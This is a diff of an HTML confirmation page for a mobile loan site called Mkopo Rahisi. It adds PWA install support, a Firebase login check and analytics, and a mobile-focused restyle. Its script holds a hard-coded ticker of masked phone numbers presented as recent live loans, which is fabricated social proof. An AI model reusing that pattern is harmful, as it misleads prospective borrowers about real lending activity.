@@ -3,10 +3,25 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="icon" type="image/png" href="IMG-20250323-WA0008.png">
     <title>Confirmation - Mkopo Rahisi</title>
+    
+    <!-- PWA Configuration -->
+    <link rel="manifest" href="/manifest.json">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-title" content="Mkopo Rahisi">
+    <link rel="apple-touch-icon" href="icons/icon-192x192.png">
+    <meta name="theme-color" content="#2563eb">
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-analytics-compat.js"></script>
+
     <style>
         :root {
             --primary: #2563eb;
@@ -18,8 +33,8 @@
             --success: #10b981;
             --warning: #dd6b20;
             --danger: #e53e3e;
-            --border-radius: 12px;
-            --box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            --border-radius: 10px;
+            --box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
             --transition: all 0.3s ease;
         }
 
@@ -33,7 +48,7 @@
         body {
             background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
             color: var(--dark);
-            line-height: 1.6;
+            line-height: 1.5;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -42,29 +57,29 @@
         .header-banner {
             background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
             color: white;
-            padding: 0.8rem 0;
+            padding: 0.7rem 0;
             text-align: center;
-            font-size: 0.9rem;
+            font-size: 0.85rem;
             font-weight: 500;
         }
 
         .ticker {
             background: rgba(255, 255, 255, 0.9);
             color: var(--success);
-            padding: 1rem;
+            padding: 0.8rem;
             text-align: center;
-            font-size: 0.95rem;
+            font-size: 0.85rem;
             font-weight: 500;
             display: flex;
             justify-content: center;
             align-items: center;
-            gap: 0.8rem;
+            gap: 0.6rem;
             animation: fadeInDown 0.6s ease-in-out;
             border-bottom: 1px solid rgba(209, 243, 209, 0.5);
         }
 
         .ticker i {
-            font-size: 1.1rem;
+            font-size: 1rem;
         }
 
         @keyframes fadeInDown {
@@ -79,64 +94,65 @@
         }
 
         .container {
-            max-width: 900px;
-            margin: 2rem auto;
-            padding: 2rem;
+            max-width: 500px;
+            margin: 1rem auto;
+            padding: 1.2rem;
             background: white;
-            border-radius: 16px;
+            border-radius: 14px;
             box-shadow: var(--box-shadow);
             flex: 1;
         }
 
         .logo {
-            font-size: 2rem;
+            font-size: 1.5rem;
             font-weight: 700;
             color: var(--primary);
-            margin-bottom: 1.5rem;
+            margin-bottom: 1rem;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            gap: 8px;
         }
 
         .logo i {
             color: var(--accent);
+            font-size: 1.3rem;
         }
 
         h2 {
             color: var(--primary);
-            margin-bottom: 1rem;
-            font-size: 1.4rem;
+            margin-bottom: 0.8rem;
+            font-size: 1.2rem;
             font-weight: 600;
         }
 
         .info-section {
-            margin-bottom: 2rem;
+            margin-bottom: 1.5rem;
             background: white;
-            border-radius: 16px;
-            padding: 1.5rem;
+            border-radius: 14px;
+            padding: 1.2rem;
             box-shadow: var(--box-shadow);
             transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
         .info-section:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.1);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
         }
 
         .savings-section {
             background: linear-gradient(135deg, rgba(37, 99, 235, 0.1) 0%, rgba(16, 185, 129, 0.1) 100%);
-            padding: 1.5rem;
+            padding: 1.2rem;
             border-radius: var(--border-radius);
-            border-left: 4px solid var(--primary);
+            border-left: 3px solid var(--primary);
             position: relative;
             overflow: hidden;
         }
 
         .info-section p {
             color: var(--dark);
-            margin-bottom: 1rem;
-            font-size: 1rem;
+            margin-bottom: 0.8rem;
+            font-size: 0.9rem;
         }
 
         .info-section strong {
@@ -148,23 +164,23 @@
             display: inline-flex;
             align-items: center;
             justify-content: center;
-            padding: 1rem 1.5rem;
+            padding: 0.9rem;
             background: linear-gradient(135deg, var(--secondary) 0%, var(--primary) 100%);
             color: white;
             border: none;
             border-radius: var(--border-radius);
-            font-size: 1rem;
+            font-size: 0.95rem;
             font-weight: 600;
             cursor: pointer;
             transition: var(--transition);
-            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
+            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.25);
             text-decoration: none;
             width: 100%;
         }
 
         .btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
+            box-shadow: 0 6px 16px rgba(16, 185, 129, 0.35);
         }
 
         .btn:active {
@@ -178,31 +194,32 @@
 
         .payment-instructions {
             background-color: var(--light);
-            padding: 1.5rem;
-            border-left: 4px solid var(--primary);
+            padding: 1.2rem;
+            border-left: 3px solid var(--primary);
             border-radius: var(--border-radius);
-            margin: 1.5rem 0;
+            margin: 1.2rem 0;
         }
 
         .payment-instructions p {
-            margin-bottom: 0.8rem;
+            margin-bottom: 0.7rem;
             display: flex;
             align-items: center;
             gap: 0.5rem;
+            font-size: 0.9rem;
         }
 
         .payment-instructions p i {
             color: var(--primary);
-            font-size: 1.1rem;
-            min-width: 20px;
+            font-size: 1rem;
+            min-width: 18px;
         }
 
         .verify-btn {
             display: block;
-            margin: 2rem auto;
+            margin: 1.5rem auto;
             text-align: center;
             width: 100%;
-            max-width: 300px;
+            max-width: 280px;
         }
 
         .modal {
@@ -220,37 +237,39 @@
 
         .modal-content {
             background: white;
-            padding: 2rem;
+            padding: 1.5rem;
             border-radius: var(--border-radius);
             width: 90%;
-            max-width: 420px;
+            max-width: 380px;
             text-align: center;
             position: relative;
             box-shadow: var(--box-shadow);
-            animation: fadeInUp 0.5s ease-in-out;
+            animation: fadeInUp 0.4s ease-in-out;
         }
 
         .modal-content h3 {
             color: var(--primary);
-            margin-bottom: 1rem;
+            margin-bottom: 0.8rem;
+            font-size: 1.1rem;
         }
 
         .modal-content textarea {
             width: 100%;
-            padding: 0.8rem;
+            padding: 0.7rem;
             border: 1px solid #e2e8f0;
             border-radius: var(--border-radius);
-            margin-bottom: 1rem;
+            margin-bottom: 0.8rem;
             resize: vertical;
-            min-height: 120px;
+            min-height: 100px;
             font-family: inherit;
+            font-size: 0.9rem;
         }
 
         .close-btn {
             position: absolute;
-            top: 10px;
-            right: 15px;
-            font-size: 1.5rem;
+            top: 8px;
+            right: 12px;
+            font-size: 1.3rem;
             color: #64748b;
             background: none;
             border: none;
@@ -269,17 +288,19 @@
             transform: translateX(-50%);
             background: var(--danger);
             color: white;
-            padding: 1rem 1.5rem;
+            padding: 0.8rem 1.2rem;
             border-radius: var(--border-radius);
             display: none;
             z-index: 9999;
-            box-shadow: 0 4px 15px rgba(239, 68, 68, 0.3);
+            box-shadow: 0 4px 12px rgba(239, 68, 68, 0.3);
             font-weight: 500;
+            font-size: 0.9rem;
+            max-width: 90%;
         }
 
         @keyframes fadeInUp {
             from {
-                transform: translateY(50px);
+                transform: translateY(40px);
                 opacity: 0;
             }
             to {
@@ -303,14 +324,16 @@
         }
 
         .status-message {
-            font-size: 1.3rem;
-            margin-bottom: 1.5rem;
+            font-size: 1.1rem;
+            margin-bottom: 1.2rem;
             color: var(--dark);
             font-weight: 600;
+            text-align: center;
+            padding: 0 1rem;
         }
 
         .status-icon {
-            font-size: 3rem;
+            font-size: 2.5rem;
             color: var(--primary);
         }
 
@@ -318,15 +341,15 @@
             display: flex;
             flex-direction: column;
             gap: 0.5rem;
-            margin: 0.8rem 0;
+            margin: 0.7rem 0;
         }
 
         .till-number {
             background: rgba(240, 245, 255, 0.8);
-            padding: 0.8rem 1rem;
+            padding: 0.7rem;
             border-radius: var(--border-radius);
             font-family: monospace;
-            font-size: 1.1rem;
+            font-size: 1rem;
             color: var(--primary);
             font-weight: 600;
             display: inline-block;
@@ -335,90 +358,75 @@
         }
 
         .copy-till-btn {
-            padding: 1rem;
-            font-size: 0.95rem;
+            padding: 0.9rem;
+            font-size: 0.9rem;
             width: 100%;
-            max-width: 200px;
+            max-width: 180px;
             margin: 0 auto;
         }
 
         .copy-till-btn i {
-            margin-right: 0.5rem;
+            margin-right: 0.4rem;
         }
 
         .footer {
             text-align: center;
             margin-top: auto;
             color: white;
-            font-size: 0.85rem;
-            padding: 1.5rem 0;
+            font-size: 0.8rem;
+            padding: 1.2rem 0;
             background: var(--dark);
         }
 
-        @media (max-width: 768px) {
-            .container {
-                margin: 1rem;
-                padding: 1.5rem;
-            }
-            
-            .ticker {
-                font-size: 0.85rem;
-                padding: 0.8rem;
-            }
-            
-            .verify-btn {
-                max-width: none;
-            }
+        /* PWA Install Button */
+        #installButton {
+            position: fixed;
+            bottom: 70px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 20px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            box-shadow: 0 4px 20px rgba(37, 99, 235, 0.3);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            z-index: 999;
+            width: auto;
+            min-width: 240px;
+            white-space: nowrap;
+            transition: transform 0.3s ease;
+            animation: pulse-blue 2s infinite;
+        }
 
-            .till-container {
-                flex-direction: column;
-                align-items: center;
-            }
-            
-            .till-number {
-                width: 100%;
-                text-align: center;
-            }
-            
-            .copy-till-btn {
-                max-width: 100%;
-                width: 100%;
-            }
+        #installButton.show {
+            transform: translateX(-50%) translateY(0);
+        }
 
-            h2 {
-                font-size: 1.2rem;
-            }
+        #installButton i {
+            font-size: 1rem;
+        }
 
-            .info-section p {
-                font-size: 0.95rem;
-            }
-
-            .payment-instructions p {
-                font-size: 0.9rem;
-            }
-
-            .btn {
-                font-size: 0.95rem;
-                padding: 0.9rem;
-            }
-
-            .logo {
-                font-size: 1.5rem;
-            }
-
-            .logo i {
-                font-size: 1.4rem;
-            }
+        @keyframes pulse-blue {
+            0% { box-shadow: 0 0 0 0 rgba(37, 99, 235, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(37, 99, 235, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(37, 99, 235, 0); }
         }
 
         @media (max-width: 480px) {
             .container {
-                padding: 1.2rem;
+                padding: 1rem;
                 margin: 0.5rem;
             }
 
             .info-section {
-                padding: 1.2rem;
+                padding: 1rem;
             }
 
             .payment-instructions {
@@ -430,7 +438,32 @@
             }
 
             .info-section p {
+                font-size: 0.85rem;
+            }
+
+            .btn {
                 font-size: 0.9rem;
+                padding: 0.8rem;
+            }
+
+            .logo {
+                font-size: 1.3rem;
+            }
+
+            .logo i {
+                font-size: 1.2rem;
+            }
+
+            .modal-content {
+                padding: 1.2rem;
+            }
+
+            #installButton {
+                bottom: 60px;
+                padding: 10px 16px;
+                font-size: 0.85rem;
+                min-width: 90%;
+                max-width: 280px;
             }
         }
     </style>
@@ -502,25 +535,92 @@
         &copy; 2025 Mkopo Rahisi. Licensed by CBK. All rights reserved.
     </footer>
 
-    <!-- Firebase App (Core SDK) -->
-    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-    <!-- Firebase Database -->
-    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+    <!-- PWA Install Button -->
+    <button id="installButton" style="display: none;">
+        <i class="fas fa-download"></i> Install App
+    </button>
 
     <script>
+        // Firebase configuration
         const firebaseConfig = {
-            apiKey: "AIzaSyCjnv5_IGHQVa5tXUBmH6FDYxBUvSREVsQ",
-            authDomain: "okoa-mkopo-straight-to-m-pesa.firebaseapp.com",
-            projectId: "okoa-mkopo-straight-to-m-pesa",
-            storageBucket: "okoa-mkopo-straight-to-m-pesa.appspot.com",
-            messagingSenderId: "398221059857",
-            appId: "1:398221059857:web:92874816cd6a8365008eb0",
-            measurementId: "G-T0MQ5Q1FW1"
+            apiKey: "AIzaSyCASu52RKh0cUP74lNVONDxkH0IKC7B9Ak",
+            authDomain: "mkopo-rahisi-2dee5.firebaseapp.com",
+            projectId: "mkopo-rahisi-2dee5",
+            storageBucket: "mkopo-rahisi-2dee5.firebasestorage.app",
+            messagingSenderId: "463971994215",
+            appId: "1:463971994215:web:2d3ef1001cee2b201be2c2",
+            measurementId: "G-BRKFJJR3BM"
         };
 
         // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
         const db = firebase.database();
+        const analytics = firebase.analytics();
+
+        // Check if user is logged in
+        auth.onAuthStateChanged((user) => {
+            if (!user) {
+                // User not logged in, redirect to login page
+                window.location.href = 'login.html';
+            } else {
+                // User is logged in, proceed with page functionality
+                analytics.logEvent('confirmation_viewed');
+            }
+        });
+
+        // Register Service Worker for PWA
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                registerServiceWorker();
+            });
+        }
+
+        async function registerServiceWorker() {
+            try {
+                const registration = await navigator.serviceWorker.register('/sw.js');
+                console.log('ServiceWorker registration successful');
+
+                // Handle PWA install prompt
+                window.addEventListener('beforeinstallprompt', (e) => {
+                    e.preventDefault();
+                    const installButton = document.getElementById('installButton');
+                    
+                    // Only show the button if not already installed
+                    if (!window.matchMedia('(display-mode: standalone)').matches) {
+                        installButton.style.display = 'flex';
+                        setTimeout(() => installButton.classList.add('show'), 500);
+                        
+                        installButton.addEventListener('click', () => {
+                            e.prompt();
+                            installButton.style.display = 'none';
+                        });
+                        
+                        e.userChoice.then((choiceResult) => {
+                            if (choiceResult.outcome === 'accepted') {
+                                console.log('User accepted install prompt');
+                                analytics.logEvent('pwa_installed');
+                            } else {
+                                console.log('User dismissed install prompt');
+                            }
+                        });
+                    }
+                });
+            } catch (err) {
+                console.log('ServiceWorker registration failed: ', err);
+            }
+        }
+
+        // Check if app is launched as PWA
+        window.addEventListener('appinstalled', () => {
+            console.log('PWA was installed');
+            const installButton = document.getElementById('installButton');
+            if (installButton) {
+                installButton.style.display = 'none';
+            }
+        });
+
+        // Page functionality
         const tickerMessages = [
             "0710****90 loaned Ksh 4999 — 20 minutes ago",
             "0711****45 loaned Ksh 8000 — 16 minutes ago",
